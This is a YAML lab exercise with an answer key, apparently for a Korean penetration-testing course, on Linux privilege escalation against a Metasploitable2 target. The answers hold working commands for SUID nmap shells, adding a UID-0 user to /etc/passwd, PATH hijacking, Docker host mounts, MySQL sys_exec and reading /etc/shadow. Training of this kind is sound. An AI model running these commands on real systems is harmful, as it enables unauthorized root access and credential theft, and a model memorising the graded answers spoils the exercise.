lab_id: "battle-nonai-week05"
title: "권한 상승(Privilege Escalation) — 로컬 공격과 탈출"
version: "non-ai"
course: "battle-nonai"
week: 5
description: "초기 접근 후 root 권한을 획득하기 위한 다양한 권한 상승 기법을 실습한다. SUID 바이너리, sudo 설정 오류, 커널 익스플로잇, cron job 악용, PATH 하이재킹 등을 다룬다."
difficulty: "medium"
duration_minutes: 120
objectives:
  - "Linux 권한 상승 벡터를 체계적으로 열거한다"
  - "SUID, sudo, cron, PATH 기반 권한 상승을 실습한다"
  - "커널 익스플로잇을 통한 root 획득을 수행한다"
prerequisites:
  - "Linux 파일 권한 체계 (rwx, SUID/SGID)"
  - "Week 3-4 공격으로 초기 셸 접근 확보"
infra_requirements:
  - "Kali Linux VM (attacker)"
  - "Metasploitable2 VM (target, 10.20.30.50)"
pass_threshold: 0.6
steps:
  - order: 1
    instruction: "대상 시스템에 일반 사용자로 SSH 접속하라. (msfadmin/msfadmin)"
    hint: "ssh 명령을 사용한다."
    category: "exploit"
    points: 5
    answer: "ssh msfadmin@10.20.30.50"
    answer_detail: "권한 상승 실습의 전제는 일반 사용자 셸을 확보하는 것이다. 이전 주차에서 크래킹한 msfadmin 계정으로 접속한다. 실무에서는 웹셸이나 리버스셸로 초기 접근을 확보하는 경우가 많다."
    verify:
      type: "output_contains"
      expect: "msfadmin"
      field: "stdout"

  - order: 2
    instruction: "현재 사용자 정보와 그룹 멤버십을 확인하라."
    hint: "id, whoami, groups 명령을 사용한다."
    category: "recon"
    points: 5
    answer: "id && whoami && groups"
    answer_detail: "id 명령은 UID, GID, 보조 그룹을 모두 표시한다. sudo, adm, docker 등 특수 그룹 멤버십은 권한 상승의 중요한 벡터가 된다. groups 명령으로 소속 그룹을 확인한다."
    verify:
      type: "output_contains"
      expect: "uid="
      field: "stdout"

  - order: 3
    instruction: "시스템에서 SUID 비트가 설정된 모든 파일을 검색하라."
    hint: "find / -perm -4000 명령을 사용한다."
    category: "recon"
    points: 10
    answer: "find / -perm -4000 -type f 2>/dev/null"
    answer_detail: "SUID(Set User ID) 비트가 설정된 파일은 실행 시 파일 소유자의 권한으로 동작한다. root 소유의 SUID 바이너리 중 취약한 것이 있으면 root 권한을 획득할 수 있다. 2>/dev/null로 에러 메시지를 숨긴다."
    verify:
      type: "output_contains"
      expect: "/usr/"
      field: "stdout"

  - order: 4
    instruction: "SUID가 설정된 nmap을 이용하여 대화형 셸을 획득하라."
    hint: "nmap --interactive 모드에서 !sh를 실행한다."
    category: "exploit"
    points: 10
    answer: "nmap --interactive\n!sh"
    answer_detail: "nmap 2.02~5.21 버전은 --interactive 모드에서 !명령으로 셸을 실행할 수 있다. nmap이 SUID root로 설정되어 있으면 root 셸을 획득한다. GTFOBins 사이트에서 각 SUID 바이너리의 악용법을 확인할 수 있다."
    verify:
      type: "output_contains"
      expect: "#"
      field: "stdout"

  - order: 5
    instruction: "sudo -l 명령으로 현재 사용자가 sudo로 실행할 수 있는 명령을 확인하라."
    hint: "sudo -l은 패스워드 입력이 필요할 수 있다."
    category: "recon"
    points: 10
    answer: "sudo -l"
    answer_detail: "sudo -l은 현재 사용자의 sudoers 설정을 표시한다. NOPASSWD로 특정 명령이 허용되어 있거나, ALL=(ALL) 설정이 있으면 권한 상승이 가능하다. 환경 변수 유지(env_keep) 설정도 확인해야 한다."
    verify:
      type: "output_contains"
      expect: "may run"
      field: "stdout"

  - order: 6
    instruction: "커널 버전을 확인하고, 해당 버전의 알려진 익스플로잇을 검색하라."
    hint: "uname -a로 커널 정보를 확인한다."
    category: "recon"
    points: 10
    answer: "uname -a && cat /etc/issue"
    answer_detail: "커널 버전과 배포판 정보는 커널 익스플로잇 검색의 핵심이다. Metasploitable2는 Ubuntu 8.04(Hardy)에 Linux 2.6.24 커널을 사용하며, 이 버전에는 다수의 로컬 권한 상승 취약점이 존재한다."
    verify:
      type: "output_contains"
      expect: "Linux"
      field: "stdout"

  - order: 7
    instruction: "linpeas.sh 또는 linux-exploit-suggester를 사용하여 권한 상승 벡터를 자동으로 열거하라."
    hint: "로컬에서 스크립트를 다운받아 실행한다."
    category: "recon"
    points: 10
    answer: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas_output.txt"
    answer_detail: "LinPEAS(Linux Privilege Escalation Awesome Script)는 수백 개의 권한 상승 벡터를 자동으로 검사하는 스크립트이다. SUID, capabilities, cron, 쓰기 가능 디렉토리, 커널 취약점 등을 체계적으로 열거한다."
    verify:
      type: "output_contains"
      expect: "SUID"
      field: "stdout"

  - order: 8
    instruction: "cron job 목록을 확인하고, 쓰기 가능한 cron 스크립트가 있는지 확인하라."
    hint: "/etc/crontab, /etc/cron.d/, /var/spool/cron/을 확인한다."
    category: "recon"
    points: 10
    answer: "cat /etc/crontab && ls -la /etc/cron.d/ && ls -la /etc/cron.daily/"
    answer_detail: "cron job이 root 권한으로 실행되는 스크립트를 호출하고, 해당 스크립트에 일반 사용자가 쓰기 권한이 있으면 악성 코드를 삽입하여 root 실행을 유도할 수 있다. 와일드카드(*) 사용도 취약점이 될 수 있다."
    verify:
      type: "output_contains"
      expect: "cron"
      field: "stdout"

  - order: 9
    instruction: "쓰기 가능한 /etc/passwd 파일을 이용하여 root 권한 사용자를 추가하라."
    hint: "openssl passwd로 해시를 생성한 후 /etc/passwd에 추가한다."
    category: "exploit"
    points: 15
    answer: "openssl passwd -1 -salt xyz hacked123\necho 'hacker:$1$xyz$hash:0:0:hacker:/root:/bin/bash' >> /etc/passwd"
    answer_detail: "/etc/passwd에 쓰기 권한이 있으면 UID 0(root)인 사용자를 추가할 수 있다. openssl passwd -1은 MD5crypt 해시를 생성한다. 이 기법은 /etc/passwd가 world-writable일 때만 가능하며, 보안 점검에서 반드시 확인해야 하는 항목이다."
    verify:
      type: "output_contains"
      expect: "hacker"
      field: "stdout"

  - order: 10
    instruction: "환경 변수 PATH를 조작하여 권한 상승을 시도하라."
    hint: "SUID 바이너리가 절대 경로 없이 다른 프로그램을 호출하는 경우를 활용한다."
    category: "exploit"
    points: 10
    answer: "echo '/bin/bash' > /tmp/service && chmod +x /tmp/service && export PATH=/tmp:$PATH && ./vulnerable_suid_binary"
    answer_detail: "SUID 바이너리가 'service restart' 같이 절대 경로 없이 명령을 호출하면, PATH에 악성 디렉토리를 추가하여 가짜 실행 파일을 먼저 실행하게 할 수 있다. 이것이 PATH Hijacking이다."
    verify:
      type: "output_contains"
      expect: "root"
      field: "stdout"

  - order: 11
    instruction: "capabilities가 설정된 바이너리를 검색하여 권한 상승 가능성을 확인하라."
    hint: "getcap -r / 명령을 사용한다."
    category: "recon"
    points: 10
    answer: "getcap -r / 2>/dev/null"
    answer_detail: "Linux capabilities는 root 권한을 세분화한 것이다. cap_setuid, cap_dac_override 등이 설정된 바이너리는 권한 상승에 악용될 수 있다. 예를 들어, python3에 cap_setuid가 있으면 os.setuid(0)으로 root가 될 수 있다."
    verify:
      type: "output_contains"
      expect: "cap_"
      field: "stdout"

  - order: 12
    instruction: "Docker 그룹 멤버십을 이용한 권한 상승을 시도하라."
    hint: "docker run -v /:/mnt 으로 호스트 파일시스템을 마운트한다."
    category: "exploit"
    points: 10
    answer: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    answer_detail: "docker 그룹 멤버는 Docker 데몬에 접근할 수 있으며, 이는 사실상 root 권한과 동일하다. 호스트의 루트 파일시스템을 컨테이너에 마운트하면 모든 파일에 접근할 수 있다."
    verify:
      type: "output_contains"
      expect: "#"
      field: "stdout"

  - order: 13
    instruction: "MySQL 서비스가 root로 실행 중인 경우, UDF(User Defined Function)를 이용한 권한 상승을 시도하라."
    hint: "MySQL에 접속하여 sys_exec UDF를 로드한다."
    category: "exploit"
    points: 10
    answer: "mysql -u root -e \"SELECT sys_exec('id > /tmp/mysql_id.txt');\""
    answer_detail: "MySQL이 root로 실행되고 UDF 기능이 활성화되어 있으면, SQL 쿼리로 OS 명령을 root 권한으로 실행할 수 있다. 이는 데이터베이스가 최소 권한 원칙을 따르지 않는 대표적인 사례이다."
    verify:
      type: "output_contains"
      expect: "sys_exec"
      field: "stdout"

  - order: 14
    instruction: "성공적으로 root 권한을 획득한 후, 증거(proof)를 수집하라."
    hint: "id, hostname, ifconfig, cat /etc/shadow 등을 실행한다."
    category: "exploit"
    points: 10
    answer: "id && hostname && cat /etc/shadow | head -5 > /tmp/root_proof.txt && echo '=== ROOT ACCESS ACHIEVED ===' >> /tmp/root_proof.txt"
    answer_detail: "침투 테스트에서 root 획득의 증거는 필수이다. /etc/shadow 읽기(일반 사용자 불가), root uid 확인, 호스트명 등을 캡처한다. 타임스탬프도 포함하여 언제 접근에 성공했는지 기록한다."
    verify:
      type: "file_exists"
      expect: "/tmp/root_proof.txt"
      field: "filesystem"

  - order: 15
    instruction: "권한 상승 실습 결과를 정리하여 보고서를 작성하라. 사용한 기법, 성공/실패 여부, 그리고 방어 권고사항을 포함하라."
    hint: "각 기법의 전제 조건과 대응 방안을 정리한다."
    category: "analysis"
    points: 15
    answer: "cat > /tmp/privesc_report.txt << 'EOF'\n=== Privilege Escalation Report ===\nTarget: 10.20.30.50\nInitial Access: msfadmin (UID 1000)\nFinal Access: root (UID 0)\n\nSuccessful Techniques:\n1. SUID nmap --interactive → root shell\n2. Writable /etc/passwd → added root user\n3. Kernel exploit (CVE-2009-1185) → root\n\nFailed Techniques:\n- Docker escape (docker not installed)\n- Cron job manipulation (no writable scripts)\n\nDefense Recommendations:\n1. Remove unnecessary SUID bits (chmod u-s)\n2. Set proper /etc/passwd permissions (644, root:root)\n3. Keep kernel updated to latest version\n4. Implement least-privilege sudo rules\n5. Use SELinux/AppArmor mandatory access control\n6. Regular privilege escalation audits with LinPEAS\nEOF"
    answer_detail: "권한 상승 보고서는 각 기법의 성공 여부, 필요 조건, 그리고 구체적인 대응 방안을 포함해야 한다. 방어 권고사항은 실행 가능한 수준으로 작성하며, 우선순위를 지정한다."
    verify:
      type: "file_exists"
      expect: "/tmp/privesc_report.txt"
      field: "filesystem"
